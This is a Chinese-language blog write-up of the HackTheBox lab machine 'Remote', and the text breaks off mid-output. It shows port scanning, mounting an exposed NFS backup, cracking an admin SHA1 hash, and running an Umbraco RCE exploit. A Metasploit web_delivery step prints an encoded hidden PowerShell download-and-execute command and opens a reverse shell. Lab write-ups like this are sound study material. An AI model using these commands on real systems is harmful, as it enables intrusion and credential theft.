@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="Hu9Do8Tx47t851t8Rdk0NlwZL3UeW0wOkTbVzqLFU9w">
+  <meta name="msvalidate.01" content="A35AD8AE43092D6BAF78D36FAC56B4DD">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ry0ma24.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content=".incibuvitsfr{zoom:50%;}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Remote">
+<meta property="og:url" content="https://ry0ma24.github.io/posts/685379b3.html">
+<meta property="og:site_name" content="相忘于江湖">
+<meta property="og:description" content=".incibuvitsfr{zoom:50%;}">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/685379b3/image-20250223220027043.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/685379b3/image-20250223220241146.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/685379b3/image-20250223220501688.png">
+<meta property="article:published_time" content="2025-02-23T12:44:10.000Z">
+<meta property="article:modified_time" content="2025-04-25T08:44:00.918Z">
+<meta property="article:author" content="Ry0ma24">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="信息收集">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ry0ma24.github.io/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png">
+
+
+<link rel="canonical" href="https://ry0ma24.github.io/posts/685379b3.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ry0ma24.github.io/posts/685379b3.html","path":"posts/685379b3.html","title":"HTB-Remote"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB-Remote | 相忘于江湖</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="相忘于江湖" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">相忘于江湖</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生天地之间，若白驹之过隙，忽然而已</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-Scan"><span class="nav-number">1.</span> <span class="nav-text">Nmap Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ry0ma24"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ry0ma24</p>
+  <div class="site-description" itemprop="description">好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdXJuYW1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnlvdXJuYW1lQGdtYWlsLmNvbQ==" title="E-Mail → mailto:yourname@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ry0ma24.github.io/posts/685379b3.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ry0ma24">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="相忘于江湖">
+      <meta itemprop="description" content="好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB-Remote | 相忘于江湖">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Remote
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-23 20:44:10" itemprop="dateCreated datePublished" datetime="2025-02-23T20:44:10+08:00">2025-02-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-04-25 16:44:00" itemprop="dateModified" datetime="2025-04-25T16:44:00+08:00">2025-04-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Hackthebox/" itemprop="url" rel="index"><span itemprop="name">Hackthebox</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><style>.incibuvitsfr{zoom:50%;}</style><img src="/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png" class="incibuvitsfr">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.180 <span class="token parameter variable">-sV</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
+Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">20</span>:44 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65516</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT      STATE    SERVICE       VERSION
+<span class="token number">21</span>/tcp    <span class="token function">open</span>     <span class="token function">ftp</span>           Microsoft ftpd
+<span class="token number">80</span>/tcp    <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token number">111</span>/tcp   <span class="token function">open</span>     rpcbind       <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>     netbios-ssn   Microsoft Windows netbios-ssn
+<span class="token number">445</span>/tcp   <span class="token function">open</span>     microsoft-ds?
+<span class="token number">2049</span>/tcp  <span class="token function">open</span>     nlockmgr      <span class="token number">1</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100021)</span>
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token number">15264</span>/tcp filtered unknown
+<span class="token number">22011</span>/tcp filtered unknown
+<span class="token number">47001</span>/tcp <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token number">49664</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49665</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49666</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49667</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49678</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49679</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">49680</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
+<span class="token number">53739</span>/tcp filtered unknown
+Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">251.51</span> seconds</code></pre>
+
+<p>首先尝试FTP(21)匿名登录，啥也没有，然后对NFS(2049)进行测试，发现网站备份文件，挂载后可以查找到admin凭证</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ showmount <span class="token parameter variable">-e</span> <span class="token number">10.10</span>.10.180              
+Export list <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180:
+/site_backups <span class="token punctuation">(</span>everyone<span class="token punctuation">)</span>
+$ <span class="token function">mkdir</span> /tmp/site_backups 
+$ <span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">10.10</span>.10.180:/site_backups /tmp/site_backups
+$ <span class="token builtin class-name">cd</span> /tmp/site_backups 
+$ <span class="token function">ls</span>
+App_Browsers  aspnet_client  css           Media    Umbraco_Client
+App_Data      bin            default.aspx  scripts  Views
+App_Plugins   Config         Global.asax   Umbraco  Web.config
+$ <span class="token builtin class-name">cd</span> App_Data 
+strings Umbraco.sdf <span class="token operator">|</span> <span class="token function">grep</span> admin
+Administratoradmindefaulten-US
+Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span><span class="token number">192.168</span>.195.1User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span>umbraco/user/password/changepassword change
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre>
+
+<p>将获取到的密码hash进行破解，将收集到的用户名密码备用</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'b8be16afba8c314ad33d812f22a04991b90e2aaa'</span> <span class="token operator">></span> sha1  
+$ john sha1 <span class="token parameter variable">--format</span><span class="token operator">=</span>Raw-SHA1 <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>Raw-SHA1 <span class="token punctuation">[</span>SHA1 <span class="token number">256</span>/256 AVX2 8x<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider <span class="token parameter variable">--fork</span><span class="token operator">=</span><span class="token number">8</span>
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+baconandcheese   <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
+1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-02-23 <span class="token number">21</span>:45<span class="token punctuation">)</span> <span class="token number">1</span>.694g/s 16650Kp/s 16650Kc/s 16650KC/s baconandchipies1<span class="token punctuation">..</span>bacon918
+Use the <span class="token string">"--show --format=Raw-SHA1"</span> options to display all of the cracked passwords reliably
+Session completed.                          </code></pre>
+
+<p>添加本地域名解析到hosts文件，并访问站点，可以找到一个登录页面</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.180 remote.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
+
+<img src="/posts/685379b3/image-20250223220027043.png" class="" title="访问网站">
+
+<p>使用收集到的用户名密码，登录网站，获取网站版本</p>
+<img src="/posts/685379b3/image-20250223220241146.png" class="" title="登录页面">
+
+<img src="/posts/685379b3/image-20250223220501688.png" class="" title="查看版本">
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pvbm9hbnMvVW1icmFjby1SQ0U=">https://github.com/Jonoans/Umbraco-RCE<i class="fa fa-external-link-alt"></i></span></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ python exploit.py <span class="token parameter variable">-u</span> admin@htb.local <span class="token parameter variable">-p</span> baconandcheese <span class="token parameter variable">-w</span> <span class="token string">'http://remote.htb'</span> <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.16.30
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4444</span>: Done
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4444: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49695</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4445</span>: Done
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4445: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49696</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span> <span class="token function">whoami</span>
+iis apppool<span class="token punctuation">\</span>defaultapppool
+PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span>  </code></pre>
+
+<p>将shell 转移到msfconsole：使用<code>multi/script/web_delivery</code> 复制生成的powershell链接，在获取到的shell 上执行，成功获取到shell，查看系统信息为 Windows Server 2019 (10.0 Build 17763)</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> show targets 
+
+Exploit targets:
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Id  Name
+    --  ----
+<span class="token operator">=</span><span class="token operator">></span>  <span class="token number">0</span>   Python
+    <span class="token number">1</span>   PHP
+    <span class="token number">2</span>   PSH
+    <span class="token number">3</span>   Regsvr32
+    <span class="token number">4</span>   pubprn
+    <span class="token number">5</span>   SyncAppvPublishingServer
+    <span class="token number">6</span>   PSH <span class="token punctuation">(</span>Binary<span class="token punctuation">)</span>
+    <span class="token number">7</span>   Linux
+    <span class="token number">8</span>   Mac OS X
+
+
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> target <span class="token number">2</span>
+target <span class="token operator">=</span><span class="token operator">></span> <span class="token number">2</span>
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
+payload <span class="token operator">=</span><span class="token operator">></span> windows/x64/meterpreter/reverse_tcp
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4446</span>
+LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4446</span>
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
+LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> SRVPORT <span class="token number">8088</span>
+SRVPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8088</span>
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4446 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://10.10.16.30:8088/1JHqco9l
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Server started.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the following <span class="token builtin class-name">command</span> on the target machine:
+powershell.exe <span class="token parameter variable">-nop</span> <span class="token parameter variable">-w</span> hidden <span class="token parameter variable">-e</span> <span class="token assign-left variable">WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AG4AVABYAGcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAegBuAFQAWABnAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAegBuAFQAWABnAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAvAEUATABkAEkAMgBNAFUAUwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAnACkAKQA7AA</span><span class="token operator">==</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering AMSI Bypass <span class="token punctuation">(</span><span class="token number">1383</span> bytes<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering Payload <span class="token punctuation">(</span><span class="token number">3703</span> bytes<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49698<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:07:25 +0800
+
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions 
+
+Active sessions
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
